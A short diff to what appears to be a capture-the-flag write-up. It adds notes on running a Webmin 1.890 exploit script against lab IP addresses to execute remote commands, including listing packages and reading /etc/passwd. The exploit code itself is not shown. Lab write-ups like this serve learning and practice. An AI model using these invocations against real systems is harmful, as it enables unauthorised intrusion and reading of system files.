@@ -1,3 +1,7 @@
+### What tools?
+Bcos Ubuntu uses `apt` by default I assumed it's installed
+`sudo python3 webmin-1.890_exploit.py 10.10.132.155 10000 'apt list' > ~/Workspace/dir/list`
+
 ### User flag
 `sudo python3 webmin-1.890_exploit.py 10.10.79.206 10000 'cat /etc/passwd'`
 ```
